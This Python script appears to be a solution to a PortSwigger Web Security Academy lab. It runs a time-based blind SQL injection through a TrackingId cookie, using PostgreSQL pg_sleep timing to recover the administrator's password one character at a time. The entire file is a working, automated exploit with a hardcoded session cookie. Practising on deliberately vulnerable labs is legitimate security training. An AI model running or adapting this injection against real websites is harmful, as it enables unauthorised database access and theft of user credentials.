import requests
import string
import urllib3
from urllib.parse import quote

# Remove anoying warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Base url
url = "https://0a3f00c50464a65fdf65e099008d0005.web-security-academy.net/"

# Get the 'current' character of the password an put it in the payload DBMS = PostgreSQL
def getpay(char, i):
    payload = f"';SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, {i}, 1) = '{char}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users --"
    return payload

# Get the password
def blind(url):
    password = ""
    
    while True:
        i = len(password) + 1
        for char in string.ascii_lowercase + string.digits:
            payload = getpay(char, i)
            encoded_p = quote(payload)
            headers = {
                "Cookie": f"session=M3iM5wiXPlbfRZLzLjsPBoN0cFgiqVR2; TrackingId=3bFWD5uhxYfc8QJW{encoded_p}",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
            }
            try:
                r = requests.get(url, headers=headers, verify=False, timeout=5)
                # if the request took more than 2 seconds, the character is correct
                if r.elapsed.total_seconds() > 2:
                    password += char
                    print(f"Pass = {password}", end="\r")
                    break
            except requests.exceptions.RequestException as e:
                print(f"Erro na requisição: {e}")
                return
        else:
            break

    return password

if __name__ == "__main__":
    print("Senha =", blind(url))
